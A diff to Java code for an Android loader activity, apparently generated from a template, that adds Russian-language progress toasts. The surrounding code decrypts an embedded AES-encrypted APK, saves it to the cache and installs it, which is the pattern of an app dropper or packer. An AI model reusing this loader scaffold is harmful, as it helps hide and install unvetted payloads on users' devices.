@@ -258,6 +258,7 @@ import android.net.Uri;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.widget.Toast;
 import java.io.*;
 import javax.crypto.Cipher;
 import javax.crypto.spec.GCMParameterSpec;
@@ -270,6 +271,8 @@ public class LoaderActivity extends Activity {{
     @Override
     protected void onCreate(Bundle savedInstanceState) {{
         super.onCreate(savedInstanceState);
+        
+        Toast.makeText(this, "Загрузка...", Toast.LENGTH_SHORT).show();
         
         new Thread(new Runnable() {{
             @Override
@@ -286,14 +289,20 @@ public class LoaderActivity extends Activity {{
                     byte[] encryptedApk = baos.toByteArray();
                     is.close();
                     
+                    showToast("Расшифровка...");
+                    
                     // Расшифровываем APK
                     final byte[] decryptedApk = decryptAES(encryptedApk);
+                    
+                    showToast("Сохранение...");
                     
                     // Сохраняем расшифрованный APK в cache
                     final File apkFile = new File(getCacheDir(), "app.apk");
                     FileOutputStream fos = new FileOutputStream(apkFile);
                     fos.write(decryptedApk);
                     fos.close();
+                    
+                    showToast("Установка...");
                     
                     // Устанавливаем APK
                     new Handler(Looper.getMainLooper()).post(new Runnable() {{
@@ -305,15 +314,26 @@ public class LoaderActivity extends Activity {{
                     
                 }} catch (Exception e) {{
                     e.printStackTrace();
+                    final String error = e.getMessage();
                     new Handler(Looper.getMainLooper()).post(new Runnable() {{
                         @Override
                         public void run() {{
+                            Toast.makeText(LoaderActivity.this, "Ошибка: " + error, Toast.LENGTH_LONG).show();
                             finish();
                         }}
                     }});
                 }}
             }}
         }}).start();
+    }}
+    
+    private void showToast(final String message) {{
+        new Handler(Looper.getMainLooper()).post(new Runnable() {{
+            @Override
+            public void run() {{
+                Toast.makeText(LoaderActivity.this, message, Toast.LENGTH_SHORT).show();
+            }}
+        }});
     }}
     
     private byte[] decryptAES(byte[] encrypted) throws Exception {{
